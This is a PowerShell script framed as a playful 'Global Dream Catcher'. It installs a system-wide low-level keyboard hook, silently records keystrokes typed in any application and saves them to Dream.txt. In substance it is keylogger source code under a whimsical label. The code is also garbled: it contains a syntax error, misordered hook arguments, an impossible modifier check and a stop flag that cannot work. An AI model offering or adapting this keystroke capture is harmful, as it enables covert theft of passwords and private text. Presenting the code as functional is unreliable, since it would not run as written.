# Global Dream Catcher with Stop Feature

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class GlobalKeyboardHook
{
    [DllImport("user32.dll")]
    public static extern int SetWindowsHookEx(int idHook, KeyboardHookDelegate lpfn, IntPtr hInstance, uint threadId);

    [DllImport("user32.dll")]
    public static extern int UnhookWindowsHookEx(int idHook);

    [DllImport("user32.dll")]
    public static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    public delegate int KeyboardHookDelegate(int nCode, int wParam, IntPtr lParam);

    public const int WH_KEYBOARD_LL = 13;
    public const int WM_KEYDOWN = 0x0100;
}
"@

$UserInput = ""
$DreamContent = ""

$StopFlag = $false

$keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_KEYBOARD_LL, {
    param($nCode, $wParam, $lParam)

    if ($nCode -ge 0 -and $wParam -eq [GlobalKeyboardHook]::WM_KEYDOWN) {
        $kbStruct = [GlobalKeyboardHook]::KBDLLHOOKSTRUCT]::new()
        [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [ref]$kbStruct)

        $KeyChar = [char]$kbStruct.vkCode

        # Pressing Ctrl+ALT+S stops the capture
        if ($KeyChar -eq 'S' -and [Console]::Modifiers -eq [ConsoleModifiers]::Control -and [Console]::Modifiers -eq [ConsoleModifiers]::Alt) {
            $StopFlag = $true
        }

        if (-not $StopFlag) {
            $DreamContent += $KeyChar
        }
    }

    return [GlobalKeyboardHook]::CallNextHookEx(0, $nCode, $wParam, $lParam)
}, [System.AppDomain]::CurrentDomain.GetCurrentThreadId(), 0)

Write-Host "Welcome to the Global Dream Catcher with Stop Feature!"
Write-Host "Type your thoughts using any keyboard input, and it will be captured silently."
Write-Host "Press Ctrl+ALT+S to stop capturing."

# Start capturing user input
while ($true) {
    if ($StopFlag) {
        break
    }
}

# Unhook the global keyboard hook
[GlobalKeyboardHook]::UnhookWindowsHookEx($keyboardHook)

$DreamFileName = "Dream.txt"

# Save the user's thoughts to a .txt file
$DreamContent | Out-File -FilePath $DreamFileName

Write-Host "Your dream has been saved in '$DreamFileName'. Goodnight and sweet dreams!"
